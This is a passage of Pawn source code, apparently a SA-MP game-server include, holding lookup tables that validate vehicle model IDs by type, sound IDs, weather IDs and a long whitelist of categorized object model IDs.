		420,   //taxi  -  car
		459,   //topfun  -  car
		576,   //tornado  -  car
		583,   //tug  -  car
		451,   //turismo  -  car
		558,   //uranus  -  car
		552,   //utility  -  car
		540,   //vincent  -  car
		491,   //virgo  -  car
		412,   //voodoo  -  car
		478,   //walton  -  car
		421,   //washing  -  car
		529,   //willard  -  car
		555,   //windsor  -  car
		456,   //yankee  -  car
		554,   //yosemite,   //car
		477,   //zr3	50  -  car
		588,   //hotdog  -  car
		437,   //coach  -  car
		532,   //combine  -  car
		433,   //barracks,   //car
		414,   //mule  -  car
		443,   //packer  -  car
		470,   //patriot  -  car
		432,   //rhino  -  car
		525,   //towtruck,   //car
		531,   //tractor  -  car
		408,   //trash  -  car
		406,   //dumper  -  mtruck
		573,   //duneride,   //mtruck
		444,   //monster  -  mtruck
		556,   //monstera,   //mtruck
		557	//monsterb,   //mtruck
		: return 0;
		case
		581,   //bf400  -  bike
		523,   //copbike  -  bike
		462,   //faggio  -  bike
		521,   //fcr900  -  bike
		463,   //freeway  -  bike
		522,   //nrg500  -  bike
		461,   //pcj600  -  bike
		448,   //pizzaboy,   //bike
		468,   //sanchez  -  bike
		586,   //wayfarer,   //bike
		509,   //bike  -  bmx
		481,   //bmx  -  bmx
		510,   //mtbike  -  bmx
		471   //quad  -  quad
		: return 1;
		case
		472,   //coastg  -  boat
		473,   //dinghy  -  boat
		493,   //jetmax  -  boat
		595,   //launch  -  boat
		484,   //marquis  -  boat
		430,   //predator,   //boat
		453,   //reefer  -  boat
		452,   //speeder  -  boat
		446,   //squalo  -  boat
		454   //tropic  -  boat
		: return 2;
		case
		548,   //cargobob,   //heli
		425,   //hunter  -  heli
		417,   //leviathn,   //heli
		487,   //maverick,   //heli
		497,   //polmav  -  heli
		563,   //raindanc,   //heli
		501,   //rcgoblin,   //heli
		465,   //rcraider,   //heli
		447,   //seaspar  -  heli
		469,   //sparrow  -  heli
		488	   //vcnmav  -  heli
		: return 3;
		case
		592,   //androm  -  plane
		577,   //at	400  -  plane
		511,   //beagle  -  plane
		512,   //cropdust,   //plane
		593,   //dodo  -  plane
		520,   //hydra  -  plane
		553,   //nevada  -  plane
		464,   //rcbaron  -  plane
		476,   //rustler  -  plane
		519,   //shamal  -  plane
		460,   //skimmer  -  plane
		513,   //stunt  -  plane
		539   //vortex  -  plane
		: return 4;
		case
		435,   //artict1  -  trailer
		450,   //artict2  -  trailer
		591,   //artict3  -  trailer
		606,   //bagboxa  -  trailer
		607,   //bagboxb  -  trailer
		610,   //farmtr1  -  trailer
		584,   //petrotr  -  trailer
		608,   //tugstair,   //trailer
		611,   //utiltr1  -  trailer
		590,   //freibox  -  train
		569,   //freiflat,   //train
		537,   //freight  -  train
		538,   //streak  -  train
		570,   //streakc  -  train
		449   //tram  -  train
		: return 5;
	}
	return -1;
}
//=[IsValidSound]===============================================================
stock IsValidSound(soundid)
{   // by [?£®]$!7£?©!?, improved by me
	switch(soundid)
	{
		case 1002, 1009, 1027, 1035, 1036, 1039, 1052, 1053,
		1054, 1055, 1056, 1057, 1058, 1062, 1063, 1068,
		1069, 1076, 1077, 1083, 1084, 1085, 1097, 1098,
		1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137,
		1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145,
		1146, 1147, 1148, 1149, 1150, 1153, 1154, 1163,
		1165, 1166, 1169, 1183, 1184, 1185, 1186, 1187,
		1188
		: return 1;
		default: return 0;
	}
	return 0;
}
//=[IsValidWeather]=============================================================
stock IsValidWeather(weatherid) return weatherid < 0 || weatherid > 50? 0:1;
//=[IsValidObjectModel]=========================================================
stock IsValidObjectModel(omodelid)
{   // by opium, improved by me
	switch(omodelid)
	{
		case 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232,
		1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242,
		1243, 1445, 1487, 1299, 4022, 620, 4550, 15030, 15029, 15031,
		15042, 1768, 1818, 1717, 2100, 2023, 2297, 2126, 2249, 2138,
		2139, 2136, 2135, 2121, 2109, 13592, 13666, 13641, 13639,
		13634, 8493, 3374, 1305, 2918, 1472, 9766, 5130, 4563, 1468, 1583,
		1584, 1574, 1248, 1512, 1598, 1608, 1594, 1607, 1813, 3642, 3616,
		9322, 2780, 3425, 3461, 3515, 3524, 3528, 3586, 6865,
		7916, 8484, 8979, 14608, 16776, 3397, 10009, 13831, 14467, //jacob objects
		902, 903, 953, 1461, 1599, 1600, 1601, 1602, 1603, 1604, 1605,
		1606, 1609, 1610, 1611, 1637, 1640, 1641, 1642,
		1643, 2404, 2405, 2406, 2410, 2782, //beach and sea
		1612, 3406, 3578, 3620, 3753, 3879, 3886, 5108, 5109, 5115, 5143, 5145,
		5146, 5154, 5155, 5156, 5157, 5158, 5160, 5166, 5167, 5176, 5184, 6188,
		6189, 6230, 6300, 8373, 9090, 9229, 9230, 9253, 9257, 9329, 9584, 9585,
		9586, 9590, 9612, 9613, 9818, 9819, 9820, 9821, 9822, 9829, 9858, 9902,
		9954, 9955, 9956, 9958, 10140, 10226, 10227, 10229, 10230, 10300, 10301,
		10305, 10771, 10793, 10794, 10795, 10824, 10826, 10827, 10828, 10830, 10831,
		10833, 10834, 10841, 11009, 11145, 11146, 11237, 11495, 12990, 16502, 17068,
		18024, //ships docks etc
		3249, 6869, 6985, 6987, 6988, 6989, 7071, 7263, 7265, 7289, 7521, 8395, 8399,
		8400, 8501, 8663, 9070, 9071, 9072, 9076, 9104, 9582, 10398, 10713, 13132, 14399,
		14463, 14533, 14536, 14537, 14546, 14560, 14563, 14581, 14590, 14606, 14607, 14614,
		14623, 14624, 14625, 14738, 14777, 14785, 14808, 14809, 14815, 14821, 14831, 14832,
		14835, 14836, 14838, 16021, 16051, 16146, 16150, 16690, 17523, 17700, 18018, 18028,
		18090, //bar & casino
		3689, 3707, 3755, 3776, 4860, 5129, 5131, 5135, 5137, 5138, 5139, 5174, 5175, 5177,
		5180, 5183, 5192, 5278, 5309, 5310, 5313, 5397, 5728, 6340, 6404, 6490, 6925, 7019,
		7020, 7021, 7035, 7269, 7490, 7492, 7494, 7495, 7496, 7497, 7513, 7627, 7832, 7861,
		8057, 8058, 8059, 8060, 8061, 8062, 8063, 8064, 8065, 8066, 8067, 8069, 8254, 8255,
		8260, 8300, 8544, 8545, 8546, 9243, 9244, 9247, 9260, 9680, 10775, 10776, 10840, 10843,
		10844, 10845, 10846, 10847, 10856, 10965, 10966, 11010, 11011, 11012, 11081, 11085, 11086,
		11087, 11089, 11090, 11093, 11233, 11234, 11235, 11236, 11244, 11290, 11293, 11295, 11461,
		11543, 12847, 12931, 12941, 12981, 12988, 13059, 13060, 13061, 13065, 13066, 13077, 13078,
		13198, 14572, 14577, 14588, 14784, 14795, 16271, 16272, 16385, 16398, 16399, 16400, 17012,
		17013, 17014, 17015, 17016, 17017, 17021, 17022, 17023, 17024, 17038, 17040, 17049, 17050,
		17051, 17072, 17073, 17538, 17546, 17636, 18200, 18365, 18496, //factories and warehouses
		1675, 1677, 3167, 3168, 3169, 3170, 3171, 3172, 3173, 3174, 3175, 3178, 3241, 3242, 3246,
		3250, 3253, 3283, 3284, 3285, 3303, 3304, 3305, 3306, 3307, 3308, 3309, 3310, 3311, 3312,
		3313, 3314, 3315, 3316, 3317, 3351, 3353, 3355, 3356, 3362, 3414, 3415, 3417, 3418, 3442,
		3443, 3444, 3445, 3446, 3449, 3454, 3455, 3456, 3457, 3464, 3466, 3483, 3484, 3485, 3486,
		3487, 3488, 3501, 3555, 3556, 3557, 3558, 3580, 3582, 3583, 3584, 3587, 3588, 3589, 3590,
		3595, 3596, 3597, 3598, 3599, 3600, 3601, 3602, 3603, 3604, 3605, 3606, 3607, 3608, 3609,
		3612, 3613, 3614, 3617, 3618, 3619, 3622, 3623, 3624, 3626, 3628, 3634, 3635, 3639,
		3640, 3641, 3644, 3646, 3648, 3649, 3651, 3653, 3655, 3661, 3676, 3677, 3678, 3684,
		3697, 3698, 3700, 3702, 3704, 3711, 3713, 3741, 3759, 3762, 3764, 3765, 3783, 3820, 3821,
		3822, 3823, 3824, 3825, 3826, 3827, 3828, 3829, 3830, 3842, 3843, 3844, 3845, 4178, 4861,
		4886, 5060, 5151, 5341, 5416, 5421, 5423, 5425, 5444, 5445, 5446, 5447, 5448, 5450, 5451,
		5452, 5453, 5461, 5462, 5475, 5476, 5520, 5626, 5642, 5643, 5655, 5656, 5722, 5723, 5775,
		5874, 5891, 5892, 5986, 6038, 6039, 6041, 6042, 6047, 6057, 6058, 6132, 6133, 6134, 6135,
		6136, 6137, 6138, 6284, 6285, 6286, 6294, 6436, 6522, 6868, 6920, 6921, 6922, 6923, 6926,
		7200, 7287, 7489, 7491, 7533, 7534, 7535, 7681, 7885, 7929, 7932, 7940, 8425, 8427, 8428,
		8433, 8437, 8513, 9098, 9220, 9221, 9227, 9228, 9238, 9258, 9259, 9270, 9271, 9272, 9273,
		9274, 9275, 9319, 9320, 9323, 9324, 9325, 9326, 9327, 9328, 9341, 9495, 9496, 9497,
		9498, 9499, 9500, 9501, 9502, 9503, 9504, 9506, 9507, 9509, 9510, 9511, 9512, 9513, 9515,
		9516, 9517, 9518, 9520, 9521, 9522, 9523, 9524, 9529, 9547, 9549, 9550, 9572, 9573, 9576,
		9577, 9578, 9579, 9580, 9581, 9592, 9598, 9599, 9737, 9738, 9739, 9740, 9741, 9742, 9748,
		9749, 9750, 9751, 9752, 9753, 9754, 9762, 9763, 9764, 9765, 9894, 9895, 9903, 9904, 9909,
		9916, 9920, 9927, 9947, 9948, 9952, 10013, 10014, 10015, 10016, 10017, 10019, 10020, 10021,
		10022, 10043, 10048, 10050, 10053, 10055, 10080, 10084, 10086, 10101, 10187, 10188, 10189,
		10278, 10287, 10289, 10306, 10427, 10634, 10988, 10989, 10990, 10991, 10992, 10993, 10995,
		10998, 11001, 11002, 11004, 11433, 11490, 11491, 11501, 11502, 11503, 12937, 12938, 12939,
		12940, 12991, 13681, 13687, 13694, 13695, 13696, 13697, 13701, 13721, 13724, 13729, 13746,
		13747, 13753, 13754, 13755, 13816, 14385, 14388, 14389, 14390, 14417, 14418, 14419, 14420,
		14421, 14422, 14423, 14424, 14425, 14426, 14427, 14428, 14429, 14430, 14431, 14471, 14474,
		14475, 14476, 14484, 14485, 14492, 14495, 14500, 14512, 14525, 14526, 14534, 14639, 14700,
		14701, 14702, 14703, 14706, 14707, 14708, 14709, 14710, 14711, 14712, 14713, 14714, 14717,
		14718, 14735, 14736, 14746, 14748, 14750, 14754, 14755, 14756, 14758, 14759, 14760, 14771,
		14801, 14803, 14859, 14865, 14889, 15041, 15046, 15048, 15054, 15055, 15058,
		15059, 16105, 16280, 16285, 16689, 17005, 17008, 17041, 17044, 17045, 17067, 17335, 17547,
		17549, 17551, 17552, 17553, 17554, 17555, 17560, 17562, 17573, 17575, 17679, 17690, 17697,
		17698, 17699, 17804, 17807, 17809, 17859, 17888, 17893, 17894, 17901, 17922, 17926,
		17928, 17934, 17944, 18230, 18258, 18259, 18267, //buildings, apartments
		3781, 4002, 4005, 4006, 4007, 4008, 4017, 4019, 4021, 4023, 4028, 4033, 4113, 4193,
		4558, 4559, 4564, 4569, 4570, 4571, 4572, 4573, 4576, 4585, 4586, 4587, 4600, 4601,
		4602, 4603, 4681, 4690, 4718, 5033, 5735, 5736, 5740, 5767, 5881, 5882, 5999, 6059, 6063,
		6087, 6088, 6099, 6100, 6102, 6148, 6159, 6199, 6205, 6211, 6212, 6288, 6332, 6336, 6342,
		6351, 6364, 6366, 6368, 6371, 6373, 6388, 6389, 6390, 6391, 6966, 6993, 7009, 7528, 7584,
		7585, 7696, 8391, 8392, 8393, 8419, 8421, 8422, 8424, 8434, 8480, 8482, 8485, 8488, 8489,
		8490, 8527, 8528, 8555, 8565, 8566, 8568, 9361, 9907, 9919, 10027, 10041, 10044, 10056, 10060,
		10063, 10143, 10308, 10610, 10619, 10676, 10871, 10945, 10947, 10948, 11431, 11566, 13006, 14593,
		14594, 14595, 14597, 14602, 16004, 16326, 17533, //offices and skyscrapers
		967, 1638, 1684, 3243, 3292, 3293, 3504, 3615, 3866, 3873, 3887, 3976, 3980, 3986, 3998, 4013,
		4014, 4079, 4101, 4103, 4552, 4554, 5116, 5402, 5403, 5408, 5426, 5705, 5706, 5708, 5710, 5711,
		5712, 5716, 5720, 5763, 5835, 5837, 5863, 5864, 5865, 5886, 6036, 6037, 6040, 6296, 6337, 6863,
		6864, 6866, 6871, 6872, 6873, 6874, 6875, 6962, 6994, 7011, 7023, 7027, 7094, 7511, 7525, 8034,
		84079, 8130, 8131, 8136, 8168, 8169, 8230, 8231, 8237, 8397, 8431, 8500, 8575, 8578, 8591,
		8620, 8675, 8867, 8870, 8881, 8882, 8955, 9037, 9039, 9052, 9078, 9106, 9114, 9310, 9593, 9623,
		9624, 9834, 9835, 9836, 9900, 9901, 9918, 9931, 9949, 9950, 9951, 10023, 10031, 10049, 10270,
		10368, 10377, 10378, 10379, 10380, 10381, 10401, 10433, 10631, 10829, 10832, 10941, 10942,
		11008, 11015, 11088, 11425, 11426, 11427, 11428, 11440, 11441, 11442, 11443, 11444, 11445,
		11446, 11447, 11451, 11454, 11457, 11458, 11459, 11492, 12805, 12925, 12928, 12929, 12935,
		12942, 12943, 12959, 12960, 12978, 12983, 13007, 13027, 13190, 13295, 13725, 14408, 14412,
		14413, 14415, 14444, 14445, 14447, 14466, 14530, 14576, 14592, 16095, 16096, 16137, 16138,
		16287, 16344, 16348, 16352, 16354, 16359, 16364, 16376, 16386, 16387, 16563, 16564, 16769,
		16770, 16774, 17688, 17946, 18033, 18036, 18045, 18049, 18065, 18234, 18235, 18236, 18274,
		18552, //other buildings
		3436, 3469, 4016, 4141, 4857, 4887, 4888, 5168, 5189, 5406, 5413, 5418, 5430, 5718, 5732,
		5814, 6010, 6257, 6283, 6907, 7037, 7240, 7387, 7389, 7426, 7509, 7596, 7972, 7973, 8409,
		8411, 8498, 8499, 8534, 8535, 8710, 9615, 9824, 9859, 9860, 9898, 10193, 10194, 10195, 10196,
		10197, 10310, 10412, 10425, 10446, 10606, 10718, 10744, 11469, 11549, 11674, 12924, 12976, 13361,
		14383, 14479, 14506, 14655, 14674, 14675, 15033, 15034, 15053, 16012, 16066, 16067,
		16070, 16106, 16143, 16144, 16562, 16568, 16605, 16673, 16767, 16781, 17534, 18009, 18020, 18021,
		18022, 18023, 18029, 18056, 18058, 18237, 18239, 18242, //resturant and hotels
		3452, 3453, 3819, 5390, 5400, 6066, 7416, 7417, 7420, 7421, 7422, 7600, 7601, 7602, 7603, 7604, 7617,
		7983, 8201, 8333, 8417, 10385, 10405, 10406, 10407, 10408, 10409, 10410, 10561, 10954, 10955,
		13595, 13598, 13599, 13602, 13603, 13606, 13607, 13608, 13609, 13610, 13611, 13612, 13613, 13614, 13615,
		13616, 13617, 13618, 13619, 13620, 13621, 13624, 13625, 13627, 13631, 13628, 13632, 13629, 13633, 13630,
		13642, 13650, 13651, 13657, 13661, 13662, 13659, 13660, 13801, 14449, 14486, 14488, 14778,
		14779, 14780, 14781, 14782, 14786, 14787, 14788, 14789, 14790, 14791, 14792, 14794, 14825, 14827, 17511,
		17513, 17515, 17563, 17582, 17841, //sports and stadium
		3988, 4001, 4004, 4011, 4018, 4048, 4058, 4059, 4060, 4112, 4114, 4117, 4123, 4176, 4555, 4593, 4594,
		4682, 4683, 4708, 4848, 4850, 4877, 4880, 4894, 5016, 5017, 5040, 5042, 5110, 5134, 5136, 5140, 5142, 5173,
		5179, 5181, 5182, 5187, 5267, 5392, 5393, 5410, 5414, 5521, 5532, 5628, 5704, 5709, 5717, 5719, 5721, 5725,
		5726, 5727, 5729, 5730, 5731, 5733, 5734, 5737, 5738, 5760, 5761, 5762, 5765, 5768, 5769, 5771, 5781, 5782,
		5784, 5787, 5792, 5810, 5813, 5819, 5848, 5870, 5896, 6048, 6053, 6060, 6061, 6095, 6096, 6098, 6103, 6104,
		6130, 6145, 6150, 6151, 6157, 6158, 6186, 6187, 6282, 6334, 6338, 6354, 6355, 6369, 6406, 6488, 6908, 6919,
		6924, 6944, 6946, 6947, 6977, 7088, 7234, 7424, 7493, 7506, 7507, 7508, 7510, 7526, 7529, 7531, 7554, 7599,
		7650, 7658, 7985, 8068, 8242, 8401, 8403, 8432, 8435, 8436, 8494, 8495, 8496, 8503, 8504, 8505, 8506, 8507,
		8508, 8509, 8516, 8567, 8569, 8570, 8571, 8581, 8639, 8643, 8668, 8687, 8688, 8689, 8839, 8842, 8849, 9054,
		9055, 9162, 9163, 9299, 9300, 9301, 9302, 9303, 9494, 9514, 9595, 9906, 9908, 9910, 9911, 9912, 9913, 9914,
		9917, 9921, 9922, 9923, 9924, 9925, 9926, 9928, 9929, 9953, 10025, 10028, 10030, 10035, 10037, 10038, 10039,
		10045, 10046, 10052, 10054, 10142, 10148, 10288, 10369, 10375, 10376, 10383, 10388, 10390, 10391, 10392, 10393,
		10423, 10428, 10429, 10430, 10431, 10432, 10434, 10435, 10439, 10441, 10447, 10624, 10625, 10626, 10627, 10628,
		10630, 10633, 10722, 10891, 10925, 10949, 10950, 10951, 10952, 10953, 10973, 10974, 10975, 10977, 10978, 10979,
		10980, 10981, 10982, 10994, 10996, 10997, 10999, 11000, 11092, 11301, 11312, 11314, 11315, 11317, 11434, 11436,
		11449, 11450, 11456, 11471, 11475, 11497, 11545, 11546, 11615, 12822, 12841, 12843, 12844, 12845, 12849, 12850,
		12855, 12862, 12863, 12923, 12944, 12945, 12946, 12947, 12948, 12949, 12951, 12953, 12962, 12963, 12964, 12979,
		12980, 12982, 12984, 13008, 13012, 13013, 13014, 13015, 13022, 13131, 13363, 13364, 13761, 14531, 14661, 14664,
		14665, 14667, 14670, 14671, 14672, 14676, 14682, 14689, 14668, 14669, 16005, 16007, 16011, 16053, 16054, 16064,
		16065, 16068, 16069, 16361, 16396, 16475, 17066, 17503, 17508, 17517, 17519, 17520, 17521, 17522, 17524, 17526,
		17529, 17531, 17536, 17537, 17542, 17543, 17544, 17577, 17853, 17862, 18007, 18008, 18025, 18026, 18027, 18030,
		18031, 18038, 18082, 18083, 18088, 18203, 18233, 18238, 18240, 18241, 18261, 18264, 18265, 18266,
		18282, //Stores and Shops
		1376, 1378, 1380, 1381, 1383, 1384, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 3474, 5126, 10825,
		11400, 11401, 11406, 16328, 16332, 16337, 16355, 16356, //cranes
		925, 930, 931, 944, 964, 1271, 1348, 1362, 1431, 1685, 2038, 2039, 2040, 2041, 2042, 2043, 2358, 2359, 2464, 2465,
		2466, 2468, 2476, 2477, 2478, 2479, 2480, 2481, 2483, 2567, 2654, 2669, 2678, 2679, 2694, 3565, 3566, 3568, 3569, 3570,
		3571, 3572, 3573, 3574, 3575, 3576, 3577, 3621, 3630, 3632, 3633, 3722, 3724, 3761, 3796, 3798, 3799, 3800, 5132, 5259,
		5260, 5261, 5262, 5269, 5855, 7025, 7040, 7102, 7104, 7172, 7186, 7317, 7515, 7516, 7527, 7561, 7620, 7621, 7622, 7834,
		7836, 8073, 8074, 8075, 8076, 8077, 8078, 8335, 8337, 8339, 8341, 8883, 8884, 8885, 8886, 9587, 9588, 9589, 9604, 10231,
		10248, 10576, 10773, 10774, 10811, 10814, 12821, 12859, 12860, 12861, 12913, 12927, 12930, 12955, 12977, 13025, 13489, 14549,
		14552, 14558, 14612, 14613, 14800, 14878, 16599, 16601, 17019, 17020, 17055, 18257, 18260, //crates drums racks
		914, 915, 919, 920, 927, 929, 934, 943, 958, 959, 1353, 1354, 1420, 1617, 1618, 1623, 1624, 1625, 1626, 1628, 1629, 1630, 1635,
		1687, 1688, 1689, 1690, 1691, 2649, 2653, 3214, 3255, 3256, 3257, 3258, 3259, 3272, 3273, 3287, 3384, 3427, 3470, 3502, 3529,
		3530, 3631, 3636, 3637, 3638, 3643, 3673, 3675, 3804, 3805, 3812, 3813, 3865, 6867, 6928, 6929, 6930, 6931, 6932, 6933, 6934,
		7024, 7103, 7105, 7201, 7236, 7238, 7291, 7947, 7950, 10675, 11147, 11148, 11149, 11484, 11485, 11486, 11487, 12911, 12912,
		12986, 14573, 14584, 14635, 14882, 16071, 16072, 16073, 16074, 16075, 16076, 16078, 16079, 16080, 16081, 16083, 16086, 16087,
		16267, 16301, 16309, 16311, 16314, 16316, 16318, 16340, 16342, 16345, 16346, 16349, 16395, 16446, 16481, 16530, 16531, 16532,
		16533, 16534, 16535, 16666, 16766, 17001, 18201, //general industrial
		1455, 1484, 1485, 1486, 1488, 1509, 1510, 1511, 1517, 1520, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1551,
		1664, 1665, 1666, 1667, 1668, 1669, 1732, 1950, 1951, 14565, 16151, 16152, //BAR ITEMS
		1515, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1851, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 1859, 1860, 1861,
		1862, 1863, 1864, 1865, 1866, 1867, 1868, 1869, 1870, 1871, 1872, 1873, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 1881, 1882,
		1895, 1897, 1898, 1899, 1900, 1901, 1902, 1903, 1904, 1905, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1913, 1914, 1915, 1916,
		1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 1930, 1931, 1932, 1933, 1934, 1935, 1936, 1937,
		1938, 1939, 1940, 1941, 1942, 1943, 1944, 1945, 1947, 1948, 1952, 1953, 1955, 1956, 1978, 1979, 2188, 2189, 2324, 2325, 2326,
		2327, 2347, 2348, 2349, 2618, 2640, 2681, 2754, 2778, 2779, 2783, 2785, 2872, 3430, 3437, 3438, 3440, 3441, 3494, 3498, 3499,
		3503, 14566, 14567, 14568, 14582, //CASINO OBJECTS
		936, 937, 941, 1416, 1417, 1421, 1645, 1646, 1647, 1730, 1740, 1741, 1742, 1743, 1744, 1754, 1755,
		1758, 1759, 1762, 1765, 1767, 1769, 1814, 1815, 1816, 1817, 1819, 1820, 1821, 1822, 1823,
		2000, 2007, 2014, 2015, 2016, 2018, 2019, 2020, 2021, 2022, 2024, 2025, 2046, 2063, 2065, 2066, 2067,
		2078, 2081, 2082, 2083, 2084, 2087, 2088, 2089, 2092, 2094, 2095, 2128, 2129, 2133, 2134, 2137,
		2140, 2141, 2142, 2143, 2145, 2148, 2151, 2152, 2153, 2154, 2155, 2156, 2157, 2158, 2159,
		2160, 2161, 2162, 2163, 2164, 2167, 2168, 2187, 2191, 2197, 2199, 2200, 2204, 2208, 2210, 2211, 2234,
		2235, 2236, 2291, 2292, 2295, 2303, 2304, 2305, 2306, 2307, 2323, 2328, 2329, 2330, 2334, 2335, 2338,
		2341, 2416, 2418, 2419, 2451, 2462, 2463, 2475, 2482, 2502, 2509, 2529, 2530, 2531, 2532, 2533, 2534,
		2562, 2568, 2569, 2570, 2573, 2574, 2576, 2591, 2604, 2606, 2608, 2609, 2610, 2708, 2737, 5171, 9362,
		11334, 13003, 13890, 14455, 14472, 14477, 14491, 14493, 14502, 14503, 14504, 14505, 14507, 14508, 14509,
		14510, 14535, 14540, 14543, 14544, 14556, 14632, 14633, 14640, 14704, 14719, 14720, 14721, 14739, 14741,
		14745, 14802, 14805, 14813, 14816, 14817, 14828, 14839, 14850, 14888, 14895, 15025, 15026, 15032, 15036,
		15052, 16154, 16378, 18019, 18077, //FURNITURE
		1513, 1514, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1850, 1883, 1884, 1885, 1886, 1887, 1888, 1889,
		1890, 1891, 1959, 1972, 1973, 1981, 1982, 1983, 1984, 1986, 1987, 1988, 1989, 1990, 1991, 1992, 1993, 1994,
		1995, 1996, 2012, 2362, 2365, 2366, 2367, 2368, 2369, 2375, 2376, 2379, 2385, 2387, 2388, 2393, 2403, 2412,
		2413, 2414, 2422, 2423, 2424, 2433, 2434, 2435, 2436, 2439, 2440, 2441, 2442, 2443, 2444, 2445, 2446, 2447,
		2448, 2449, 2450, 2454, 2455, 2457, 2458, 2459, 2460, 2461, 2467, 2484, 2485, 2486, 2487, 2488, 2489, 2490,
		2491, 2492, 2493, 2494, 2495, 2496, 2497, 2498, 2499, 2500, 2505, 2506, 2507, 2508, 2535, 2536, 2537, 2538,
		2539, 2540, 2541, 2542, 2543, 2544, 2545, 2546, 2547, 2548, 2549, 2550, 2551, 2552, 2553, 2554, 2555, 2556,
		2557, 2577, 2578, 2579, 2581, 2582, 2583, 2584, 2585, 2586, 2589, 2590, 2593, 2594, 2597, 2598, 2601, 2620,
		2621, 2622, 2623, 2624, 2625, 2626, 2652, 2698, 2699, 2701, 2749, 2750, 2751, 2752, 2753, 2771, 2803, 2804,
		2805, 2806, 2871, 12854, 14403, 14650, 14651, 14652, 14653, 14654, 14660, 14666, 14678, 14679, 14685, 14686,
		14693, 14811, 14890, 18061, 18064, 18070, 18092, //shop items
		643, 1256, 1280, 1281, 1368, 1432, 1433, 1516, 1562, 1563, 1663, 1670, 1671, 1679, 1704, 1705, 1708,
		1711, 1714, 1715, 1716, 1720, 1721, 1722, 1723, 1724, 1726, 1727, 1728, 1729, 1735, 1739, 1746, 1805, 1806,
		1810, 1811, 1824, 1825, 1826, 1827, 1896, 1954, 1957, 1963, 1968, 1969, 1970, 1998, 1999, 2008, 2009, 2027,
		2079, 2096, 2120, 2122, 2123, 2124, 2125, 2165, 2166, 2169, 2171, 2172, 2173, 2174, 2175, 2180, 2181,
		2182, 2183, 2184, 2185, 2193, 2198, 2205, 2206, 2207, 2209, 2293, 2308, 2309, 2310, 2311, 2313, 2314, 2315,
		2319, 2321, 2343, 2346, 2350, 2356, 2370, 2592, 2605, 2607, 2635, 2636, 2637, 2638, 2639, 2644, 2723, 2724,
		2725, 2746, 2747, 2748, 2762, 2763, 2764, 2776, 2777, 2784, 2788, 2799, 2800, 2801, 2802, 2807, 2808, 3383,
		3657, 3752, 11631, 11665, 12842, 14401, 14405, 14458, 14490, 14619, 14620, 14657, 14770, 14810, 14833, 14837,
		14869, 18055, 18057, 18059, 18060, //tables & chairs
		3975, 3977, 3978, 3981, 3982, 3983, 3984, 3985, 3987, 3989, 3997, 4000, 4010, 4012, 4020, 4027, 4029, 4030,
		4109, 4110, 4122, 4186, 4197, 4198, 4551, 4556, 4562, 4568, 4584, 4590, 4604, 4643, 4700, 4703, 4712, 4806,
		4811, 4812, 4813, 4814, 4858, 4873, 4879, 5105, 5107, 5111, 5122, 5123, 5144, 5185, 5186, 5270, 5273, 5274,
		5279, 5311, 5342, 5343, 5355, 5404, 5419, 5420, 5459, 5474, 5518, 5519, 5652, 5739, 5741, 5815, 5823, 5845,
		5857, 6064, 6101, 6152, 6160, 6165, 6213, 6217, 6227, 6280, 6281, 6293, 6297, 6312, 6313, 6343, 6347, 6398,
		6416, 6417, 6443, 6497, 6882, 6883, 6884, 6885, 6979, 7044, 7045, 7046, 7047, 7048, 7049, 7050, 7051,
		7098, 7099, 7100, 7101, 7203, 7217, 7218, 7247, 7248, 7249, 7250, 7251, 7252, 7253, 7254, 7357, 7448, 7449,
		7450, 7451, 7452, 7453, 7454, 7455, 7456, 7460, 7462, 7463, 7464, 7465, 7466, 7467, 7468, 7469, 7470, 7471,
		7472, 7473, 7474, 7530, 7553, 7557, 7588, 7882, 7889, 7994, 7996, 7997, 7999, 8000, 8001, 8003, 8004, 8005,
		8006, 8033, 8037, 8071, 8133, 8198, 8199, 8202, 8228, 8232, 8264, 8283, 8288, 8306, 8351, 8352, 8353, 8398,
		8402, 8404, 8463, 8465, 8466, 8467, 8469, 8486, 8497, 8515, 8529, 8531, 8533, 8553, 8554, 8564, 8582, 8583,
		8584, 8585, 8661, 8664, 8671, 8672, 8677, 8844, 8850, 8857, 8859, 9047, 9056, 9057, 9062, 9064, 9065, 9066,
		9083, 9135, 9136, 9137, 9138, 9139, 9140, 9173, 9209, 9215, 9216, 9223, 9224, 9234, 9236, 9246, 9249, 9254,
		9255, 9256, 9261, 9284, 9285, 9286, 9287, 9288, 9289, 9290, 9291, 9304, 9306, 9309, 9311, 9312, 9313, 9315,
		9338, 9342, 9346, 9351, 9483, 9505, 9508, 9530, 9551, 9552, 9553, 9597, 9830, 9864, 9915, 9946, 10036, 10047,
		10083, 10242, 10274, 10350, 10351, 10352, 10353, 10354, 10355, 10370, 10371, 10372, 10373, 10374, 10382, 10387,
		10389, 10395, 10399, 10404, 10413, 10436, 10438, 10443, 10559, 10563, 10564, 10565, 10566, 10567, 10568,
		10569, 10570, 10571, 10608, 10609, 10635, 10850, 10865, 10936, 10938, 10943, 10946, 10969, 10976, 11005, 11006,
		11013, 11082, 11083, 11139, 11287, 11288, 11367, 11420, 11429, 11430, 11488, 11506, 11507, 11508, 11511, 11512,
		11513, 11517, 11518, 11519, 11522, 11523, 11525, 11526, 11527, 11528, 11529, 11531, 11532, 11533, 11535, 11542,
		11553, 11559, 11629, 11647, 12823, 12870, 12908, 12926, 12952, 12969, 13083, 13103, 13106, 13134, 13135, 13136,
		13144, 13145, 13146, 13171, 13175, 13176, 13178, 13179, 13213, 13214, 13486, 13675, 13804, 13805, 13813, 13820,
		16055, 16056, 16057, 16058, 16059, 16097, 16102, 16103, 16109, 16147, 16148, 16149, 16157, 16158, 16159, 16160,
		16161, 16162, 16163, 16164, 16165, 16166, 16167, 16168, 16169, 16170, 16171, 16172, 16173, 16174, 16175, 16176,
		16177, 16178, 16179, 16180, 16181, 16182, 16184, 16185, 16186, 16187, 16188, 16189, 16190, 16191, 16192, 16193,
